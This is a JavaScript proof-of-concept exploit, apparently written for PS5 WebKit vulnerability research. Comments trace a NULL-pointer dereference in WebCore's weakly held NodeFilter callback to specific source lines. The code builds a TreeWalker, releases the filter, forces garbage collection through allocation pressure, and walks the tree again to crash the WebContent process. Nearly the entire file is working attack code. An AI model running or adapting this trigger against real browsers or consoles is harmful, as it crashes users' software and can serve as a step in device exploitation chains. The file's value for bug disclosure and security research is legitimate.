// p491-nodefilter-weak-null.js
//
// PoC: NULL-pointer dereference in WebCore's weak-callback invocation path.
//
// Target: PS5 14.20 (WebKit-1200, AppleWebKit/605.1.15), JavaScriptCore interpreter-only.
//
// Root cause (all paths in the WK-1200 tree that ships on PS5 14.20):
//   WebCore/dom/NodeFilter.idl:22-24      callback interface NodeFilter  [IsWeakCallback]
//   WebCore/dom/NodeFilter.idl:45         [SkipCallbackInvokeCheck] unsigned short acceptNode(Node)
//   WebCore/bindings/scripts/CodeGeneratorJS.pm:6678
//                                         m_data(new JSCallbackDataWeak(callback, globalObject, this))
//   WebCore/bindings/scripts/CodeGeneratorJS.pm:6785-6788
//                                         SkipCallbackInvokeCheck => NO canInvokeCallback() guard
//   WebCore/dom/Traversal.cpp:57          auto callbackResult = m_filter->acceptNode(node);  (no hasCallback() check)
//   WebCore/bindings/js/JSCallbackData.h:106-113   JSCallbackDataWeak::invokeCallback -> callback() may be null
//   WebCore/bindings/js/JSCallbackData.cpp:44      ASSERT(callback);            <-- no-op under NDEBUG
//   WebCore/bindings/js/JSCallbackData.cpp:65      function = callback->get(lexicalGlobalObject, functionName);
//   JavaScriptCore/runtime/JSObject.h:1563-1568    JSObject::get -> virtual getPropertySlot() on `this`
//
// The JS filter object is held through a JSC::Weak handle, so it can be collected
// while the TreeWalker/NodeIterator still references it.  Nothing re-checks liveness
// before the callback is invoked, so callback->get() is called on a null pointer.
//
// Expected: SIGSEGV in the WebContent process (no further beacons after P491-CRASH).

(function () {
    var out = [];
    function beacon(s) {
        out.push(s);
        try { if (window.__beacon) window.__beacon(s); } catch (e) {}
        try { document.title = s; } catch (e) {}
    }

    function forceGC() {
        // No window.gc() on retail builds; create allocation pressure instead.
        // A single large ArrayBuffer overshoots the JSC eden allocation budget and
        // forces a full GC cycle, which clears the JSC::Weak handle for the filter.
        try { new ArrayBuffer(192 * 1024 * 1024); } catch (e) {}
        var junk = [];
        for (var i = 0; i < 200000; i++) junk.push({ i: i, s: "xxxxxxxxxxxxxxxx" });
        junk.length = 0;
    }

    beacon("P491-START");

    // Build a subtree with many nodes so acceptNode() is invoked repeatedly.
    var root = document.createElement("div");
    for (var i = 0; i < 128; i++) {
        var s = document.createElement("span");
        s.setAttribute("data-i", String(i));
        root.appendChild(s);
    }
    document.body.appendChild(root);

    // The filter is referenced ONLY by the local variable `filter` and (weakly) by the
    // TreeWalker.  acceptNode() drops the last strong reference on first invocation.
    var filter = {
        acceptNode: function (node) {
            filter = null;                       // drop the only strong reference
            return NodeFilter.FILTER_ACCEPT;
        }
    };

    var walker = document.createTreeWalker(root, NodeFilter.SHOW_ALL, filter);

    // Traversal #1: acceptNode() runs, filter is released.  No crash yet.
    walker.nextNode();
    beacon("P491-FIRST-CALL-OK");

    // Collect the filter object -> JSC::Weak handle is cleared -> callback() == null.
    forceGC();
    beacon("P491-GC-DONE");

    // Traversal #2: NodeIteratorBase::acceptNode() -> m_filter->acceptNode(node)
    //   -> JSCallbackData::invokeCallback(..., callback() == nullptr, ...)
    //   -> JSCallbackData.cpp:65  callback->get(...)   ->  SIGSEGV
    beacon("P491-SECOND-CALL-ABOUT-TO-RUN");
    walker.nextNode();
    beacon("P491-SURVIVED-SECOND-CALL");          // should never print
})();
